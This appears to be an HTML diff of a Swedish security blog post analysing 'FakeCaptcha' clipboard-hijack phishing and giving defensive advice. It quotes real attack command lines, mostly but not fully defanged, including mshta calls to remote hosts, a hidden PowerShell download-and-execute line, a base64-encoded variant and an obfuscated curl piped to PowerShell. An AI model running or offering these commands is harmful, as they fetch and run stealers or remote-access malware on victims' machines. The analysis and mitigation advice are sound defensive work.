@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>redsnw</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="redsnw" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/blogpost/2026/01/29/fakecaptcha.html" />
+<meta property="og:url" content="http://localhost:4000/blogpost/2026/01/29/fakecaptcha.html" />
+<meta property="og:site_name" content="redsnw" />
+<meta property="og:image" content="http://localhost:4000/assets/img/phish_cam_1-768x768.jpeg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-01-29T00:00:00+01:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/img/phish_cam_1-768x768.jpeg" />
+<meta property="twitter:title" content="redsnw" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2026-01-29T00:00:00+01:00","datePublished":"2026-01-29T00:00:00+01:00","headline":"redsnw","image":"http://localhost:4000/assets/img/phish_cam_1-768x768.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blogpost/2026/01/29/fakecaptcha.html"},"url":"http://localhost:4000/blogpost/2026/01/29/fakecaptcha.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>redsnw</h1>
+        </a>
+        <h2></h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <article class="post">
+  <h1></h1>
+  <!--more-->
+
+<p>{% raw %}</p>
+<h1 id="fakecaptcha-phishing-analys">FakeCaptcha Phishing Analys</h1>
+<p>Denna bloggen kommer innehålla kortfattad information som jag har hittat när det gäller FakeCaptcha Phishing.</p>
+
+<h1 id="fakecaptcha">Fakecaptcha</h1>
+
+<p>FakeCaptcha är en phishing metod som använder captcha på för att lura användarna att själv skriva in illvillig powershell kod i sin dator.
+Hemsidan kommer visa en fake captcha och för att komma vidare till den “riktiga hemsidan” måste man bevisa att man är inte en robot genom att följa instruktionerna.</p>
+
+<p><img src="https://www.trendmicro.com/content/dam/trendmicro/global/en/research/25/e/unmasking-fake-captcha-cases-in-mxdr-investigations/Fig-10.png" alt="Fakecaptchaps1" /></p>
+
+<p>Instruktionerna</p>
+<ol>
+  <li>WIN + R            – Öppnar Run boxen i Windows</li>
+  <li>CTRL + V           – Klistrar in en illvillig powershell kod i run boxen</li>
+  <li>Enter              – För att köra koden i run</li>
+</ol>
+
+<p>Om du undrar hur koden blev kopierad i första hand är de för att användaren tryckte “Im not a robot” eller “Verify” först, innan instruktionerna dök upp..
+Den Kopieras i smyg utan användarens kunskap.</p>
+
+<p>Som bilden visar nedanför försöker hackarna ge användarna en falsk trygghet genom att visa bara en del av powershell koden som ser ut och vara äkta.</p>
+
+<p><img src="https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/03/run_command.jpg" alt="Fakecaptchaps1" /></p>
+
+<p>Nedanför finns det exempel på hur powershell koden kan se ut.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mshta.exe hxxps://ernier[.]shop/lyricalsync[.]mp3 # ''Ι am nοt a rοbοt: САРТСНА Verification UID: 885203
+
+mshta.exe hxxps://zb-files[.]oss-ap-southeast-1[.]aliyuncs[.]com/DPST_doc.mp3 #  ''Ι am nοt a rοbοt: САРТСНА Verification UID: 815403
+
+mshta.exe hxxp://ok[.]fish-cloud-jar[.]us/ # "Authentication needed: Secure Code 3V8MUR-9PW4S"
+
+mshta.exe hxxps://yedik[.]shop/Tech_House_Future[.]mp3 #  ''Ι am nοt a rοbοt: САРТСНА Verification UID: 885203
+
+mshta.exe hxxps://x63-hello[.]live/nF3mXcQ9FVjs1sMt[.]html #'' I'm human ID241619''
+
+mshta.exe hxxps://welcome12-world[.]com/wpDoQRpZt2PIffud[.]html #'' I'm human ID233560''
+
+mshta.exe hxxps://w19-seasalt[.]com/mbDjBsRmxM1LreEp[.]html #'' I'm human ID984662''
+
+PowerShell.exe -W Hidden -command $uri = 'hxxps[://]fessoclick[.]com/clck/dub.txt'; $content = (Invoke-WebRequest -Uri $uri).Content; Invoke-Expression $content”
+
+cmd /c "powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwB2AGkAZQB3AGUAcgAtAHYAYwBjAHAAYQBzAHMALgBjAG8AbQAvAGkAbgAuAHAAaABwAD8AYQBjAHQAaQBvAG4APQAxACcAKQA=" &amp;&amp; ✅ I am not a robot - reCAPTCHA ID: 7845
+
+mshta hxxps://check[.]nejyd[.]icu/gkcxv[.]google?i=db47f2d4-a1c2-405f-ba9f-8188d2da9156 REM ✅ Human, not a robot: Verification САРTCHA ID:658630
+
+PoWeRsHeLl -w h -c cUr"L.E"x"E" -k -L
+hxxp"s://ka"j"e"c.icu"/f"04b18c2f7ff"48bdbf06"701"38"f9eb2"4f.txt | pow"e"rs"h"el"l" -
+
+</code></pre></div></div>
+
+<p>Ett av hackarnas mål är att försöka få användarna tro att hemsidan och att instruktionerna är äkta och det gör dom genom att ändra domän namnet till nåt som ser äkta ut oftast använder dom populära hemsidor som facebook eller microsoft.</p>
+
+<p>Så som bilden visar nedanför gör dom backgrunden till den riktiga hemsidan fast suddig.</p>
+
+<p><img src="https://www.york.ac.uk/media/it-services/images/about/news/2025/Fake%20captcha,%20full%20browser.png" alt="FakeCaptcha" /></p>
+
+<h1 id="fakeerror">FakeError</h1>
+
+<p>Fake error är princip samma sak som FakeCaptcha en skillnaden är att den spelar på användarens rädsla att nånting har gått fel.
+För att övertyga användaren mer så låser hemsidan sig själv i fullskärm.
+Exempel på FakeError nedanför.</p>
+
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlFgZ371OJLB7x0fK_3a34h710DpAHQLeyLQyaBpp1jhfsFyRD0-tmkLhXAvv0VD1XnU_WK8g5O16VUob1aHIyQf2smhkn6llIaC_H5_6MwogFRD11Hfp-w2kPc9vgiBUTlnftXM7VuCMsFmBPwxtyvAokqOJbgSAndESDU3qZV6-R9SH6meqbyuyoFk8n/s1600-e365/windows.jpg" alt="FakeErrorBild" /></p>
+
+<h1 id="initial-access">Initial Access</h1>
+<p>En Lista för hackarnas olika sätt att sprida FakeCaptcha / FakeError hemsidorna</p>
+<ul>
+  <li>Äkta sidor som ersätts av FakeCaptcha / FakeError</li>
+  <li>Malvertising / SEO-poisoning</li>
+  <li>Redirictions</li>
+  <li>Fake tech support / tutorials</li>
+  <li>E-mail</li>
+</ul>
+
+<h1 id="stoppa-fakecaptcha-innan-det-händer">Stoppa FakeCaptcha innan det händer</h1>
+
+<h3 id="1-känn-igen-mönstret-direkt">1. Känn igen mönstret direkt</h3>
+<ul>
+  <li>CAPTCHA som säger <strong>Win+R → Ctrl+V → Enter</strong> = 99,9 % bluff</li>
+  <li>Samma sak med: “du är infekterad”, “fixa fel nu”, “verify human”, “säkerhetsuppdatering” + instruktioner till Run eller Terminal</li>
+</ul>
+
+<h3 id="2-avbryt-korrekt-utan-att-köra-något">2. Avbryt korrekt (utan att köra något)</h3>
+<ul>
+  <li>Stäng fliken eller hela webbläsaren</li>
+  <li>Poppar helskärm eller blockerar? → <strong>Alt+F4</strong> / <strong>Ctrl+W</strong> / döda processen i Aktivitetshanteraren</li>
+</ul>
+
+<h3 id="3-clipboard-är-fienden">3. Clipboard är fienden</h3>
+<p>De flesta varianter fyller urklippet med skadlig kommandorad.<br />
+Vanor som räddar dig:</p>
+<ul>
+  <li>Klistra <strong>aldrig</strong> in okänd text i Run / PowerShell / Terminal</li>
+  <li>Misstänker du manipulation? Kopiera ett enda ord (typ “test”) först → då skriver du över skiten</li>
+</ul>
+
+<h3 id="4-minska-ytan">4. Minska ytan</h3>
+<p>FakeCaptcha kommer oftast via malvertising, phishing eller hackade sajter.<br />
+Gör det svårare:</p>
+<ul>
+  <li>Håll webbläsare + OS uppdaterade</li>
+  <li>Använd uBlock Origin / reklamblockerare</li>
+  <li>Var allergisk mot “gratis filmer”, torrent-sidor, “PC support”-popups</li>
+</ul>
+
+<h3 id="5-för-företag--sysadmins">5. För företag / sysadmins</h3>
+<p>Vanliga FakeCaptcha-kedjor använder lolbins (living-off-the-land).<br />
+Bra snabba wins:</p>
+<ul>
+  <li>Logga / begränsa PowerShell (särskilt -EncodedCommand / -WindowStyle Hidden)</li>
+  <li>EDR-regel: larma på explorer.exe → powershell.exe / mshta.exe med suspekt cmdline</li>
+  <li>Träna användare: “riktig CAPTCHA ber dig aldrig öppna Kör”</li>
+</ul>
+
+<h3 id="6-redan-kört-kommandot-paniksteg">6. Redan kört kommandot? Paniksteg</h3>
+<ol>
+  <li>Koppla ur nätet direkt</li>
+  <li>Kör full scan (helst EDR eller bra AV)</li>
+  <li>Byt lösenord från en <strong>annan, ren</strong> dator (särskilt mail, bank, Microsoft-konto etc)</li>
+</ol>
+
+<h2 id="b-är-domänen-legitim-snabb-koll">B. Är domänen legitim? Snabb koll</h2>
+
+<ol>
+  <li>
+    <p><strong>Stavfel &amp; trix</strong><br />
+micros0ft, micro-soft, rnicrosoft, -secure, -verify, .top, .xyz osv</p>
+  </li>
+  <li>
+    <p><strong>Vem äger egentligen domänen?</strong><br />
+login-microsoft.com → ägs av microsoft.com?<br />
+microsoft.login-verify.net → ägs av net? → nej, bluff</p>
+  </li>
+  <li>
+    <p><strong>Punycode / IDN-homoglyfer</strong><br />
+xn– prefixed domän = ofta försök att se ut som apple.com / google.com</p>
+  </li>
+  <li>
+    <p><strong>HTTPS = inte tillräckligt</strong><br />
+Grönt hänglås betyder bara att certet är utfärdat. Phishingsidor har HTTPS också.</p>
+  </li>
+  <li><strong>Snabb rykteskoll</strong>
+    <ul>
+      <li>Slå in domänen i https://transparencyreport.google.com/safe-browsing/search</li>
+      <li>Ny domän + “login” / “support” / “update” = hög risk</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong>Bästa vanan</strong><br />
+Lita aldrig på länken.<br />
+Skriv adressen själv eller gå via bokmärke.<br />
+Googla varumärket → skippa annonser högst upp.</p>
+  </li>
+  <li><strong>Beteendet avslöjar</strong><br />
+Stress (“konto låses om 3 minuter”),<br />
+ber om MFA-kod “för verifiering”,<br />
+vill att du kör kommando / ringer nummer / laddar ner “fix”</li>
+</ol>
+
+<p><strong>Regel #1 att komma ihåg:</strong><br />
+Om sidan ber dig köra något i Win+R / Terminal → stäng omedelbart. Det är FakeCaptcha.</p>
+
+<p>Vill du att jag kollar en specifik domän?<br />
+Klistra bara in <strong>domännamnet</strong> (inget mer) så kör jag checklistan och säger vad som är rött/grönt.</p>
+
+<h1 id="tricks-hackarna-har-använt-sig-av">Tricks hackarna har använt sig av</h1>
+<p>Dom använder även andra metoder för att förhindra att bli påkommna av säkerhets företagen gemom att använda Cloudflare captcha på deras egna illvilliga hemsida, för att sen förhindra web crawlers av säkerhets företagen att hitta deras skadlig kod.</p>
+
+<h1 id="konsekvenserna">Konsekvenserna</h1>
+<p>Virusen som blir installerad är oftast Stealers eller RAT som sen leder till konto kappning, bedrägeri eller crypto mining</p>
+
+<h1 id="labb-ide">Labb ide</h1>
+<p>Göra en enkel version av detta med hjälp av attack och defend vm’s 
+Öppna calculator på defend vm från attack vm.</p>
+
+<h1 id="referenser">Referenser</h1>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://any.run/cybersecurity-blog/new-phishing-tactics/
+
+https://app.any.run/tasks/22b677ed-8ee9-4c25-81c0-fd9073540009/?
+utm_source=anyrunblog&amp;utm_medium=article_bottom&amp;utm_campaign=newphishing11102023&amp;utm_content=task
+
+https://intelligence.any.run/analysis/lookup#{%22query%22:%22threatName:%5C%22qrcode%5C%22%22,%22dateRange%22:180}
+
+https://pcriot.com.au/fake-cloudflare-win-r-malware-what-it-is-how-it-works-and-how-to-clean-your-site/
+
+https://community.spiceworks.com/t/getting-out-of-scareware-when-its-full-screen-and-doesnt-respond-to-control-al/966997 -- hackarna
+använder tvingat fullscreen för sin hemsida?
+
+https://www.malwarebytes.com/blog/news/2025/03/fake-captcha-websites-hijack-your-clipboard-to-install-information-stealers
+
+https://thehackernews.com/2025/08/FakeCaptcha-malware-campaign-exploits.html -- bra analys
+
+https://unit42.paloaltonetworks.com/preventing-FakeCaptcha-attack-vecto
+</code></pre></div></div>
+<p>{% endraw %}</p>
+
+</article>
+
+      </section>
+    </div>
+  </body>
+</html>
